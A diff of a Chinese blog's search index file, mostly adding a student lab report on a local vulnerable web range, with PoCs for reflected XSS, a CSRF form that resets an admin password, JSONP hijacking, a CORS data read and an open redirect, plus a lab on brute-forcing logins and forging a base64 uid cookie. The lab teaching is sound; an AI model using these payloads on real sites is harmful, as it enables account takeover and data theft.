-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.37.128:8983/front/info.php?name=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;newpassword&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwordrepeat&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- javascript自动提交 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> myform=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    myform.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用无痕浏览模式打开新窗口模拟管理员登录后并”不小心”访问URL<code>192.168.137.1:8888/test.html</code>以后，页面会自动提交事先构造的表单，这时密码已经被修改，用之前的密码admin1登录管理员显示登陆失败</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006537.png"></p>
-<p>使用修改后的密码123456可以成功登录admin1账号</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006796.png"></p>
-<h2 id="JSON-HiJacking漏洞"><a href="#JSON-HiJacking漏洞" class="headerlink" title="JSON HiJacking漏洞"></a>JSON HiJacking漏洞</h2><p>使用user1账号登录，发现返回敏感信息，可能存在Hijacking漏洞</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006632.png"></p>
-<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">hijack</span>(<span class="params">result</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(result);</span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.37.128/userdata.php?callback=hijack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>使用admin1账户登录模拟管理员访问192.168.137.1:8888&#x2F;test.html，但是页面返回null</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006613.png"></p>
-<p>如果web服务器构建在同一IP地址下，访问<code>192.168.37.128/test.html</code>，查看响应头，可以查看到敏感信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006338.png"></p>
-<h2 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h2><p>使用user1账户登录，点击个人信息html接口，返回敏感信息并且发现响应头存在<code>Access-Control-Allow-Origin: *</code>,存在CORS漏洞</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006841.png"></p>
-<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = reqListener; </span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://192.168.37.128:8983/front/cors.php&#x27;</span>,<span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">responseType</span>=<span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="language-javascript">    &#123; </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (req.<span class="property">readyState</span> === req.<span class="property">DONE</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(req.<span class="property">status</span> === <span class="number">200</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">write</span>(req.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>访问<code>192.168.137.1:8888/test.html</code>，成功跨域获取敏感信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006191.png"></p>
-<h2 id="URL跳转漏洞"><a href="#URL跳转漏洞" class="headerlink" title="URL跳转漏洞"></a>URL跳转漏洞</h2><p>使用user1账户登录，点击<code>返回登录页</code>，使用burpsuite抓包，发现存在url跳转</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006727.png"></p>
-<p>将url改成<code>www.cqupt.edu.cn</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312011006446.png"></p>
-<p>发现重定向到网站目录下</p>
-<p><img data-src="https://images.gaifagafin.top/202312011011335.png"></p>
-<p>将url改写成<code>//www.cqupt.edu.cn</code>，点击关注重定向</p>
-<p><img data-src="https://images.gaifagafin.top/202312011007051.png"></p>
-<p>成功跳转到重邮官网</p>
-<p><img data-src="https://images.gaifagafin.top/202312011007821.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>前端漏洞</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2129,35 +2049,6 @@
       </categories>
       <tags>
         <tag>Webshell扫描</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客内容测试</title>
-    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
-<p><img data-src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
-<p><img data-src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
-<p><img data-src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
-<p><img data-src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
-<p><img data-src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
-<p><img data-src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
-<p>视频插入测试，代码为：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; width: 100%; </span></span></span><br><span class="line"><span class="string"><span class="tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
-src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
-frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
-height: 100%; left: 0; top: 0;"> </iframe></div>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>picture</tag>
       </tags>
   </entry>
   <entry>
@@ -2364,6 +2255,115 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </tags>
   </entry>
   <entry>
+    <title>关于建站</title>
+    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
+<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
+<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
+<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>图床</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>前端漏洞靶场环境——front</title>
+    <url>/2023/11/27/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94front/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：前端漏洞靶场环境——front(系统有两个用户： user1&#x2F;user1 、admin1&#x2F;admin1)，要求提交实验报告</p>
+<ol>
+<li>挖掘环境中的反射型XSS漏洞，（以弹框 test13 证明）</li>
+<li>复现环境中的CSRF漏洞，设计表单，当管理员点击URL以后自动将自己的密码重置为：123456</li>
+<li>复现环境中JSON Hijacking漏洞，在另一个网站（或本机另一个端口）获取用户信息</li>
+<li>通过在服务器Web目录创建.htaccess文件，控制服务器响应头，实现CORS漏洞，在另一网站，接收HTML接口的用户信息。</li>
+<li>挖掘环境中的URL跳转漏洞，构造请求，跳转到重邮官网</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8983</code>即可</p>
+<h1 id="漏洞挖掘与复现"><a href="#漏洞挖掘与复现" class="headerlink" title="漏洞挖掘与复现"></a>漏洞挖掘与复现</h1><h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>使用用户名user1与密码user1登录<img data-src="https://images.gaifagafin.top/202312011004731.png"></p>
+<p>查看网站源码，发现参数<code>name</code>处可能存在XSS漏洞</p>
+<p><img data-src="https://images.gaifagafin.top/202312011004043.png"></p>
+<p>尝试构造PoC并发送，成功弹窗，证明存在反射型XSS漏洞</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.37.128:8983/front/info.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;test 13&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202312011004158.png"></p>
+<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>抓包查看用户点击修改密码时发送给服务器的数据包，可以看到新密码<code>newpassword</code>和确认密码<code>passwordrepeat</code>都是用<strong>POST</strong>传参</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/front/info.php?name=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.37.128:8983</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.37.128:8983/front/info.php?name=</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uid=dXNlcjE%3D; is_ad=1; PHPSESSID=ggoq5vok58252u9sdl3i043981</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-haxe"><span class="keyword">new</span><span class="type">password</span>=user1&amp;passwordrepeat=user1</span></span><br></pre></td></tr></table></figure>
+
+<p>开启攻击机的网络服务，在攻击机的www目录下建立一个html页面(<code>192.168.137.1:8888/test.html</code>)，构造修改密码功能表单，一旦受害者访问此页面，密码就会被改成<code>123456</code>，构造表单如下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.37.128:8983/front/info.php?name=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;newpassword&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwordrepeat&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- javascript自动提交 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> myform=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    myform.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用无痕浏览模式打开新窗口模拟管理员登录后并”不小心”访问URL<code>192.168.137.1:8888/test.html</code>以后，页面会自动提交事先构造的表单，这时密码已经被修改，用之前的密码admin1登录管理员显示登陆失败</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006537.png"></p>
+<p>使用修改后的密码123456可以成功登录admin1账号</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006796.png"></p>
+<h2 id="JSON-HiJacking漏洞"><a href="#JSON-HiJacking漏洞" class="headerlink" title="JSON HiJacking漏洞"></a>JSON HiJacking漏洞</h2><p>使用user1账号登录，发现返回敏感信息，可能存在Hijacking漏洞</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006632.png"></p>
+<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">hijack</span>(<span class="params">result</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(result);</span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.37.128/userdata.php?callback=hijack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>使用admin1账户登录模拟管理员访问192.168.137.1:8888&#x2F;test.html，但是页面返回null</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006613.png"></p>
+<p>如果web服务器构建在同一IP地址下，访问<code>192.168.37.128/test.html</code>，查看响应头，可以查看到敏感信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006338.png"></p>
+<h2 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h2><p>使用user1账户登录，点击个人信息html接口，返回敏感信息并且发现响应头存在<code>Access-Control-Allow-Origin: *</code>,存在CORS漏洞</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006841.png"></p>
+<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = reqListener; </span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://192.168.37.128:8983/front/cors.php&#x27;</span>,<span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">responseType</span>=<span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="language-javascript">    &#123; </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (req.<span class="property">readyState</span> === req.<span class="property">DONE</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(req.<span class="property">status</span> === <span class="number">200</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">write</span>(req.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>访问<code>192.168.137.1:8888/test.html</code>，成功跨域获取敏感信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006191.png"></p>
+<h2 id="URL跳转漏洞"><a href="#URL跳转漏洞" class="headerlink" title="URL跳转漏洞"></a>URL跳转漏洞</h2><p>使用user1账户登录，点击<code>返回登录页</code>，使用burpsuite抓包，发现存在url跳转</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006727.png"></p>
+<p>将url改成<code>www.cqupt.edu.cn</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312011006446.png"></p>
+<p>发现重定向到网站目录下</p>
+<p><img data-src="https://images.gaifagafin.top/202312011011335.png"></p>
+<p>将url改写成<code>//www.cqupt.edu.cn</code>，点击关注重定向</p>
+<p><img data-src="https://images.gaifagafin.top/202312011007051.png"></p>
+<p>成功跳转到重邮官网</p>
+<p><img data-src="https://images.gaifagafin.top/202312011007821.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>前端漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>博客内容测试</title>
+    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
+<p><img data-src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
+<p><img data-src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
+<p><img data-src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
+<p><img data-src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
+<p><img data-src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
+<p><img data-src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
+<p><img data-src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
+<p>视频插入测试，代码为：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; width: 100%; </span></span></span><br><span class="line"><span class="string"><span class="tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
+src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
+frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
+height: 100%; left: 0; top: 0;"> </iframe></div>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>picture</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界 easytornado</title>
     <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/</url>
     <content><![CDATA[<img data-src="https://images.gaifagafin.top/202311051129114.png" style="zoom:67%;" />
@@ -2464,9 +2464,9 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>Writeup</tag>
         <tag>攻防世界</tag>
         <tag>SSTI</tag>
+        <tag>Writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -3094,6 +3094,73 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
         <tag>Web</tag>
         <tag>LAMP</tag>
         <tag>环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑漏洞靶场环境——logic</title>
+    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
+<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
+<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
+<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
+<p>burpsuite开启代理</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
+<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
+
+<p>将爆出的用户名装载进有效负载集，爆破密码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p>使用爆破出的用户名及密码成功登录</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
+<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
+<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
